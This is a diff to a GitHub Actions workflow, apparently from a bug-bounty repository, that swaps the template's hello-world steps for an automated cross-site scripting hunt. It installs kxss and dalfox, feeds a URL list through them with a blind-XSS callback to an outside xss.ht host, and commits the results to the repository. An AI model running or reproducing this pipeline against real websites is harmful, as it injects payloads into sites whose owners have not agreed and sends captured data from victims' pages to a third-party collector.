@@ -10,10 +10,20 @@ jobs:
     steps:
       - uses: actions/checkout@v2
         
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      - name: Run a multi-line script
+      - name: Install Dependencies
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+                go get -u github.com/tomnomnom/hacks/kxss
+                sudo snap install dalfox
+
+      - name: XSS Hunt
+        run: |
+                cd /home/runner/go/bin/
+                cat /home/runner/work/Test-Data/Test-Data/urls-output.txt | kxss | awk '{print $9}' | dalfox pipe -b https://alexdeveloper.xss.ht | tee -a /home/runner/work/Test-Data/Test-Data/xss-output.txt
+                
+      - name: Commit Tool Output
+        run: |
+                git config --local user.email "action@github.com"
+                git config --local user.name "Github Action"
+                git add xss-output.txt
+                git commit -m "XSS-Update Output Files"
+                git push "https://ValluvarSploit:${{ secrets.TOKEN }}@github.com/ValluvarSploit/Test-Data.git" HEAD:main --follow-tags 
